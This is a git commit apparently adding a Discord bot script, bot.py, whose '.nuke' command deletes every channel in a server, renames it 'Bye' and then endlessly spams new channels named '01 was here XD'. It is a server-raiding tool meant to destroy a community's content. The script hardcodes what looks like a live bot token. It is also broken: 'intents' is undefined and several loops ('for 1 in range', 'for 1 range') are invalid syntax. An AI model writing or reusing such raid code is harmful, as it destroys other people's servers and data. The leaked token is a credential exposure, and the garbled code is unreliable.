31a320237d7f640ce1a6ca037837db25bd0ff103
Saadelamali <83782029+Saadelamali@users.noreply.github.com>
2021-05-27 17:14:05 +0000

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,51 @@
+from operator import mod
+import re
+import random
+import discord
+from discord import embeds
+from discord import colour
+from discord import user
+from discord import member
+from discord import permissions
+from discord.colour import Color 
+from discord.ext import commands
+from discord.ext.commands import bot
+from discord.ext.commands.bot import Bot
+from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
+from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
+from discord.member import Member
+from discord.utils import time_snowflake
+from discord import Intents
+from discord.ext import commands
+
+channel_names=["01 was here XD"]
+
+client = commands.AutoShardedBot(command_prefix = '.' , intents = intents)
+client.remove_command('help')
+token = 'ODM1NTI2OTI1MTI3NTE2MjIx.YIQvFg.hdn7b7WgAI8S3-1XDeWYTXWd3Oo'
+
+
+
+
+@client.command()
+async def nuke (ctx):
+    guild=ctx.message.guild
+    await ctx.message.delete()
+    
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print (f"{channel.name} has been changed")
+        except:
+            print ("wasnt changed")
+    for 1 in range(1):
+        await ctx.guild.edit("Bye")
+        print ("name changed")
+    for 1 in range(1):
+        await guild.create_text_channel(random.choice(channel_names))
+    while True:
+        for channel in guild.text_channels:
+            for 1 range (500):
+                await guild.create_text_channel(random.choice(channel_names))
+        
+client.run(token)
